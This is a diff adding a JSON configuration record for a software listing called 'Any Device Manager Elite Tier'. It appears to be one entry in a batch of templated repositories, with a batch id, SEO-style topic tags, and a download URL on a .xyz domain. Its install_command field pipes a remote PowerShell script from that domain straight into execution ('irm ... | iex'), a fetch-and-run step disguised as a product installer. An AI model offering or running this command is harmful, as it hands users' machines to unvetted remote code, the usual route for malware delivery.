@@ -1,0 +1,26 @@
+{
+  "repo": "any-device-manager-elite-tier",
+  "product": "Any Device Manager Elite Tier",
+  "kind": "remote",
+  "install_type": "download",
+  "download_url": "https://any-device-manager.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "remote",
+  "topics": [
+    "any-device-manager-release",
+    "any-device-manager-quickstart",
+    "any-device-manager-suite",
+    "any-device-manager-connection-help",
+    "device-bridge",
+    "software-hub",
+    "any-device-manager-offline-installer",
+    "cross-device",
+    "remote-desktop",
+    "stable-channel",
+    "app-catalog",
+    "any-device-manager-local-install"
+  ]
+}
